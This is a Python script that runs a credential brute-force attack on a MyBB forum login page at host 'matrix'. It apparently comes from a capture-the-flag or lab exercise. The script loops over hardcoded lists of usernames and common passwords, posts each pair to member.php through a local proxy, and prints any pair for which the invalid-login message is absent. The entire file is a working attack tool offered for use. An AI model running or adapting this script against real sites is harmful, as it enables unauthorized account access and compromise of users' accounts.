#!/usr/bin/env python3

import requests

USER_LIST = [
    'bigpaul',
    'BlackCat',
    'Jackwon',
    'PalacerKing',
    'ArnoldBagger',
    'DotHaxer',
    'DrBert',
    'BlueMan'
]

PASSWORD_LIST = [
    'password123',
    'Password123',
    'crabfish',
    'linux123',
    'secret',
    'piggybank',
    'windowsxp',
    'starwars',
    'qwerty123',
    'qwerty',
    'supermario',
    'Luisfactor05',
    'james123',
]

# Please correct the following errors before continuing:

# 

# If you have forgotten your password please retrieve a new one.

# POST /member.php HTTP/1.1
# Host: matrix
# Content-Length: 151
# Cache-Control: max-age=0
# Upgrade-Insecure-Requests: 1
# Origin: http://matrix
# Content-Type: 
# User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
# Referer: http://matrix/member.php?action=login
# Accept-Encoding: gzip, deflate
# Accept-Language: en-US,en;q=0.9
# Cookie: 
# Connection: close

URL = "http://matrix/member.php"

proxies = {
    "http": "http://127.0.0.1:8080"
}


def check_credentials(username, password):
    custom_headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": "_ga=GA1.1.963753569.1642261496; _gid=GA1.1.39436184.1642261496; loginattempts=1; mybb[announcements]=0; mybb[lastvisit]=1642272853; sid=bdf7908c3a97c30addf99687d0370924; mybb[lastactive]=1642427158"
    }

    data = f"username={username}&password={password}&remember=yes&submit=Login&action=do_login&url=http%3A%2F%2Fmatrix%2Fmember.php&my_post_key=9a2c5a044a36d0d8ed3f71cd19b90774"
    
    r1 = requests.post(URL, headers=custom_headers, data=data, proxies=proxies, allow_redirects=False)

    if "You have entered an invalid username/password combination." in r1.text:
        return False
    else:
        return True

# --------------------------
# Execution starts here

if __name__ == "__main__":
    # -- read wordlists files
    usernames = USER_LIST
    passwords = PASSWORD_LIST

    # -- for each user
    for user in usernames:
        # -- and for each password
        for password in passwords:
            print(f"Trying ({user}:{password})")
            # -- test (user, password)
            if check_credentials(user, password):
                print(f"\t\tFound credentials! ({user}:{password})")
